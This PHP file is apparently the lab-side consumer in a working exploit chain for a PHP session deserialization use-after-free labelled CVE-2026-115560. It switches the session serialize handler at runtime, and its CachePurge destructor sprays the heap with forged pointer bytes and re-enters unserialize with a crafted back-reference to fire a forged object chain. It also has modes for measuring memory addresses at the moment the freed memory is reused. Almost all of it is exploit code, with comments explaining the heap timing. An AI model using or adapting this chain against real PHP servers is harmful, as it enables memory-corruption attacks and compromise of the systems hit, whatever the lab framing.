<?php
/*
 * LAB-ONLY CVE-2026-115560 consumer: the application switches the session
 * serialize handler to "php" at runtime, then session_start() decodes the
 * file written by the upload-progress hook under the configured php_serialize
 * handler. The attacker's "|" in the progress value moves the parse start into
 * the var_destroy payload; the CachePurge dtor sprays and re-enters the
 * unserializer with "R:1020;".
 *
 * ?m=0 -> dtor records its pid and sleeps (host measures the raw session
 *          input-buffer address).
 * ?m=1 -> dtor sprays and fires the forged chain.
 * ?m=2 -> fire-shaped spray then sleep (verify the fire-time address).
 *
 * The forged carrier lives in the persistent raw session input buffer (the
 * bytes after "|"), NOT the s:4096 zend_string copy: that copy is freed when
 * the first duplicate i:0 is parsed, long before the CachePurge dtor fires at
 * the duplicate i:99999.
 */
function dlog($s)
{
    @file_put_contents('/tmp/dtor_log', $s . "\n", FILE_APPEND);
}

class CachePurge
{
    public $key;

    public function __destruct()
    {
        static $inv = 0;
        $inv++;
        $mode = $_GET['m'] ?? '1';
        dlog("dtor m=$mode inv=$inv pid=" . getmypid());
        if (($mode === '4' || $mode === '5') && $inv === 1) {
            // Skip the dry mid-parse destroy; keep the heap clean for the
            // real decode-failure var_destroy (inv=2), which is where the
            // var_entries chunk is actually freed and the UAF triggers.
            dlog("skip-first");
            return;
        }
        if ($mode === '5') {
            // Hold at the real dtor (before spraying) so the host can measure
            // the raw input buffer address at the exact UAF moment.
            @file_put_contents('/tmp/meas_pid', getmypid());
            dlog("second-measure-sleep");
            sleep(20);
            return;
        }
        if ($mode === '0') {
            @file_put_contents('/tmp/meas_pid', getmypid());
            dlog("measure-sleep");
            sleep(20);
            return;
        }
        if ($mode === '2') {
            $token = (string)$this->key;
            $spray = [];
            for ($i = 0; $i < 64; $i++) {
                $s = str_repeat("\x41", 8135);
                $q = substr($token . str_repeat("\x00", 8), 0, 8);
                for ($j = 0; $j < 8; $j++) { $s[$j] = $q[$j]; }
                $spray[] = $s;
            }
            @file_put_contents('/tmp/meas_pid', getmypid());
            dlog("spray-done");
            sleep(20);
            return;
        }
        if ($mode !== '1' && $mode !== '4') {
            return;
        }
        $token = (string)$this->key;          // 8 raw pointer bytes
        $slen = (int)($_GET['s'] ?? 8135);
        $spray = [];
        for ($i = 0; $i < 64; $i++) {
            $s = str_repeat("\x41", $slen);
            $q = substr($token . str_repeat("\x00", 8), 0, 8);
            for ($j = 0; $j < 8; $j++) { $s[$j] = $q[$j]; }
            $spray[] = $s;
        }
        dlog("spray-done");
        $ref = (int)($_GET['r'] ?? 1020);
        dlog("ref=$ref");
        $r = @unserialize('R:' . $ref . ';');
        dlog("after-unserialize");
        unset($r);
        unset($spray);
        dlog("fire-end");
    }
}

register_shutdown_function(function () { dlog("shutdown"); });
@ini_set('session.serialize_handler', 'php');
session_start();
dlog("after-session-start");
echo "115560 consumer ok\n";
